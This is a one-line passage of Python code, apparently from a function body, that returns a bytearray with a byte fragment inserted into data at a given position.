        return bytearray(bytes(data[:pos]) + fragment + bytes(data[pos:]))
